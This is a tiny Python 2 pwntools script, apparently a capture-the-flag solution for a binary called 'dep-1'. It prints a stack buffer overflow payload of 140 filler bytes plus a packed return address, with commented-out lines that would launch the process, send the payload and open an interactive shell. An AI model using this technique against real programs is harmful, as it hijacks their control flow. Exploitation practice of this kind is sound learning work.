import sys
from pwn import *


print "A"*140 + p32(0x08048553)


'''
p = process("dep-1")
context.terminal = ['tmux', 'splitw', '-h']
'''




'''
p.sendline(payload)
p.interactive()

'''

